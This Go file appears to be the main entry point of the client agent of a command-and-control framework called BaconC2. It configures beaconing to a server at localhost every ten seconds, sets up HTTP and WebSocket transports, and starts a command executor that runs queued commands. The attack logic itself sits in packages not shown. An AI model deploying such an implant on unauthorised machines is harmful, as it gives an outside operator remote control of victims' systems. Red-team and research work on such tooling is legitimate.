package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/google/uuid"
)

func main() {
	cfg := config.AgentConfig{
		AgentID:        generateAgentID(),
		ServerURL:      "http://localhost:8081",
		BeaconInterval: 10 * time.Second, // Default beacon interval
		Protocol:       "http",
	}
	cmdQueue := queue.NewMemoryQueue[models.Command]()
	resultQueue := queue.NewMemoryQueue[models.CommandResult]()

	transportProtocol := transport.NewHTTPTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue)

	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, &cfg)

	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
	if err := client.Initialize(); err != nil {
		log.Fatalf("Failed to initialize agent: %v", err)
	}

	go commandExecutor.ProcessCommandQueue()

	if err := client.Start(); err != nil {
		log.Fatalf("Failed to start agent: %v", err)
	}
	log.Println("Agent client started successfully")

	// Handle termination signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	client.Stop()
	log.Println("Agent client stopped")
}

func generateAgentID() string {
	platform := runtime.GOOS // e.g., "windows", "linux", "darwin"
	uuidStr := uuid.New().String()
	return fmt.Sprintf("%s-%s", platform, uuidStr)
}
